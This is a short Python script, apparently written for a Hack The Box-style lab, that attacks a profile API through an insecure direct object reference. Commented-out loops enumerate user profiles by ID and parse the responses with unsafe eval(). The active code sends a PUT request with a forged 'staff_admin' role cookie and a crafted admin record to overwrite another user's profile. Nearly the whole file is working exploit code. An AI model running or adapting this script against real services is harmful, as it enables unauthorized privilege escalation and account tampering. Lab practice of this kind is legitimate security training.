import requests
import json

def get(url):
    return requests.get(url)

# for i in range(1, 16):
#     req = get(f"http://94.237.56.188:50730/profile/api.php/profile/{i}").text
#     load = eval(req)
#     print(f"{i} - {load["role"]}")
    
    
# req = get(f"http://94.237.56.188:50730/profile/api.php/profile/10").text
# load = eval(req)
# print(f"{load}")

url = "http://94.237.56.188:50730/profile/api.php/profile/10"

admin = {"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}

def put(url):
    return requests.put(url, data=admin, cookies={'role': 'staff_admin'})

req = put(url)

print(req)

